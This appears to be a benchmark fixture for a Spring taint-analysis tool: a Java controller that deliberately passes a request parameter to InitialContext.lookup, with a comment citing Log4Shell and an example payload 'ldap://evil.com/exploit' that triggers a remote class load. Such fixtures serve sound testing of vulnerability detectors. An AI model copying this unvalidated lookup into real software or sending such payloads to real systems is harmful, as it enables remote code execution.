package io.github.gabrielbbaldez.springtaint.benchmark.jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * JNDI injection: an attacker-controlled name passed to {@code Context.lookup}
 * can force the server to load and execute remote code — the mechanism behind
 * Log4Shell (CVE-2021-44228). A payload such as {@code ldap://evil.com/exploit}
 * triggers a remote class load.
 *
 * <p>EXPECTED: jndi-injection (CWE-74).
 */
@RestController
public class JndiLookupController {

    @GetMapping("/lookup")
    public Object lookup(@RequestParam String name) throws NamingException { // taint-source: @RequestParam name
        InitialContext ctx = new InitialContext();
        return ctx.lookup(name);                                             // taint-sink: InitialContext.lookup -> EXPECTED jndi-injection
    }
}
